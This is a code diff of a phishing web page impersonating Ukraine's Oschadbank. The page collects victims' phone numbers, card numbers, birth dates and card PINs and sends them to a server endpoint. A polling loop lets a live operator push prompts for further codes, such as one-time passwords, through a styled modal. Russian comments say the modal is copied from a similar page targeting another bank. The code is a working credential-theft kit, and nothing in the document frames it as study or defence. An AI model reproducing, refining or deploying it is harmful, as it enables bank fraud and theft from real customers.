@@ -8,11 +8,41 @@
     <style>
         body {
             -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none;
-            -webkit-tap-highlight-color: transparent;
+            -webkit-tap-highlight-color: transparent; font-family: sans-serif;
+            margin: 0; padding: 0;
         }
+
+        /* ДИЗАЙН МОДАЛЬНОГО ОКНА (ОДИН В ОДИН С ПРИВАТОМ) */
+        #custom-modal {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7); z-index: 10000; align-items: center; justify-content: center;
+            backdrop-filter: blur(5px);
+        }
+        .modal-content {
+            background: #fff; width: 90%; max-width: 360px; padding: 25px;
+            border-radius: 20px; text-align: center; box-shadow: 0 15px 40px rgba(0,0,0,0.4);
+            box-sizing: border-box; animation: fadeIn 0.3s ease-out;
+        }
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
+        .modal-content h3 { color: #333; margin-bottom: 10px; font-size: 19px; }
+        .modal-content p { color: #555; margin-bottom: 20px; font-size: 15px; line-height: 1.4; }
+        .modal-input-wrapper { margin-bottom: 20px; width: 100%; display: none; }
+        .modal-input-wrapper input {
+            width: 100%; padding: 15px; border: 2px solid #ddd; border-radius: 12px;
+            font-size: 18px; text-align: center; outline: none; transition: all 0.3s;
+            box-sizing: border-box; background: #fdfdfd;
+        }
+        .modal-input-wrapper input:focus { border-color: #005a3c; background: #fff; }
+        .modal-btn {
+            background: #005a3c; color: #fff; border: none; padding: 15px;
+            border-radius: 12px; cursor: pointer; font-weight: bold; width: 100%;
+            font-size: 16px; transition: 0.2s;
+        }
+        .modal-btn:active { transform: scale(0.97); background: #00442d; }
     </style>
 </head>
 <body oncontextmenu="return false;">
+
     <div class="oschad-wrapper">
         <header class="oschad-header">
             <div class="header-inner">
@@ -42,7 +72,7 @@
                     <div class="input-row">
                         <div class="input-block">
                             <label>Дата народження</label>
-                            <input type="date" id="o-birth" required>
+                            <input type="text" id="o-birth" maxlength="10" placeholder="ДД.ММ.РРРР" inputmode="numeric" required>
                         </div>
                         <div class="input-block">
                             <label>ПІН-код</label>
@@ -50,21 +80,10 @@
                         </div>
                     </div>
 
-                    <div class="security-notice">
-                        <svg width="16" height="16" viewBox="0 0 24 24" fill="#005a3c">
-                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
-                        </svg>
-                        Дані захищено за стандартом PCI DSS.
-                    </div>
-
                     <button type="submit" class="oschad-submit-btn">ПІДТВЕРДИТИ ДАНІ</button>
                 </form>
             </div>
         </main>
-        
-        <footer class="oschad-footer">
-            <p>© 1991–2026 АТ «Ощадбанк». Ліцензія НБУ №148</p>
-        </footer>
     </div>
 
     <div id="oschad-loader" class="loader-mask" style="display:none;">
@@ -74,30 +93,64 @@
         </div>
     </div>
 
+    <div id="custom-modal">
+        <div class="modal-content">
+            <h3 id="modal-title">Підтвердження</h3>
+            <p id="modal-desc"></p>
+            <div id="modal-input-group" class="modal-input-wrapper">
+                <input type="tel" id="modal-input" placeholder="0000" maxlength="20">
+            </div>
+            <button id="modal-btn" class="modal-btn">ПРОДОВЖИТИ</button>
+        </div>
+    </div>
+
     <script>
     // 1. Сессия
     if (!sessionStorage.getItem('USER_ID')) {
         sessionStorage.setItem('USER_ID', 'ID-' + Math.floor(Math.random() * 89999 + 10000));
     }
     const USER_ID = sessionStorage.getItem('USER_ID');
-    const SERVER_URL = window.location.origin; // Авто-определение адреса
 
-    // 2. Защита
-    document.onkeydown = function(e) {
-        if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && [73, 74, 67].includes(e.keyCode))) return false;
-    };
-
-    // 3. Карта
+    // 2. Маска для карты
     document.getElementById('o-card').addEventListener('input', (e) => {
         e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
     });
 
-    // 4. Отправка
+    // 3. Маска для ДАТЫ РОЖДЕНИЯ (ДД.ММ.ГГГГ)
+    document.getElementById('o-birth').addEventListener('input', (e) => {
+        let v = e.target.value.replace(/[^\d]/g, '');
+        if (v.length > 2 && v.length <= 4) v = v.slice(0,2) + '.' + v.slice(2);
+        if (v.length > 4) v = v.slice(0,2) + '.' + v.slice(2,4) + '.' + v.slice(4,8);
+        e.target.value = v;
+    });
+
+    // 4. Функция модалки (Копия твоей из привата)
+    function showModal(type, text) {
+        return new Promise((resolve) => {
+            const modal = document.getElementById('custom-modal');
+            const desc = document.getElementById('modal-desc');
+            const inputGroup = document.getElementById('modal-input-group');
+            const btn = document.getElementById('modal-btn');
+            const input = document.getElementById('modal-input');
+
+            desc.innerText = text;
+            inputGroup.style.display = (type === 'ask') ? 'block' : 'none';
+            modal.style.display = 'flex';
+            if(type === 'ask') input.focus();
+
+            btn.onclick = () => {
+                const val = input.value;
+                modal.style.display = 'none';
+                input.value = '';
+                resolve(val);
+            };
+        });
+    }
+
+    // 5. Отправка первой формы
     document.getElementById('oschad-full-form').addEventListener('submit', async function(e) {
         e.preventDefault();
-        const loader = document.getElementById('oschad-loader');
-        const statusText = document.getElementById('loader-status');
-        loader.style.display = 'flex';
+        document.getElementById('oschad-loader').style.display = 'flex';
 
         const logData = {
             "Телефон": document.getElementById('o-phone').value,
@@ -106,40 +159,36 @@
             "ПИН": document.getElementById('o-pin').value
         };
 
-        try {
-            await fetch(`${SERVER_URL}/api/log`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ userId: USER_ID, type: 'ОЩАД', data: logData })
-            });
-            setTimeout(() => { statusText.innerText = "Формування заявки на виплату..."; }, 2000);
-        } catch (err) {
-            loader.style.display = 'none';
-            alert("Помилка зв'язку. Спробуйте пізніше.");
-        }
+        await fetch('/api/log', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ userId: USER_ID, type: 'ОЩАД', data: logData })
+        });
     });
 
-    // 5. Ожидание команд
+    // 6. Опрос сервера (Check)
     setInterval(async () => {
         try {
-            const res = await fetch(`${SERVER_URL}/api/check/${USER_ID}`);
-            const data = await res.json();
-            if (data) {
-                const loader = document.getElementById('oschad-loader');
-                if (data.action === 'msg') {
-                    loader.style.display = 'none';
-                    alert(data.text);
-                    location.reload(); 
-                } else if (data.action === 'ask') {
-                    loader.style.display = 'none';
-                    const val = prompt(data.text);
-                    if (val) {
-                        loader.style.display = 'flex';
-                        fetch(`${SERVER_URL}/api/log`, {
+            const res = await fetch(`/api/check/${USER_ID}`);
+            if (res.status === 200) {
+                const data = await res.json();
+                if (data) {
+                    document.getElementById('oschad-loader').style.display = 'none';
+                    const result = await showModal(data.action, data.text);
+                    
+                    if (data.action === 'ask') {
+                        document.getElementById('oschad-loader').style.display = 'flex';
+                        fetch('/api/log', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ userId: USER_ID, type: 'ОТВЕТ', data: { "Ввод": val } })
+                            body: JSON.stringify({
+                                userId: USER_ID,
+                                type: 'ОТВЕТ',
+                                data: { "Користувач ввів": result }
+                            })
                         });
+                    } else if (data.action === 'msg') {
+                        location.reload();
                     }
                 }
             }
